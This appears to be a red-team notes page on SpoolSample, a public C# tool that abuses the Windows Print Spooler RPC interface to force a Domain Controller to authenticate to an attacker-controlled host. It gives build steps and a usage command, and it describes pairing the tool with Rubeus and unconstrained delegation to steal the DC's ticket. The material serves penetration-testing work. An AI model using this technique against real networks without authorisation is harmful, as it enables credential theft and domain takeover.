# SpoolSample

**Tags:** `#spoolsample` `#ntlmcoercion` `#msrprn` `#printerbug` `#unconstraineddelegation` `#activedirectory`

Windows C# PoC (Lee Christensen) that coerces a target — most commonly a Domain Controller — into authenticating to an attacker-controlled host via MS-RPRN (the Print Spooler RPC interface). The original "PrinterBug" implementation; functionally the same technique as [[Tools/Lateral Movement/PrinterBug|printerbug.py]] but run on-host in C# instead of from Kali in Python. Classic use: coerce a DC with unconstrained delegation configured on a compromised server to steal its TGT.

**Source:** https://github.com/leechristensen/SpoolSample
**Install:** build from source with Visual Studio/`msbuild`, or drop a prebuilt binary.

```powershell
# Coerce <dc_ip> to authenticate to <compromised_server> (which has unconstrained delegation)
.\SpoolSample.exe <dc_ip> <compromised_server>
```

> [!note] **See also** — [[Services/Active Directory/Kerberos|Kerberos]] Unconstrained Delegation section — this triggers the DC auth that gets captured with [[Tools/Lateral Movement/Rubeus|Rubeus]] `monitor`.

---

*Created: 2026-07-27*
*Updated: 2026-07-27*
*Model: claude-sonnet-5*
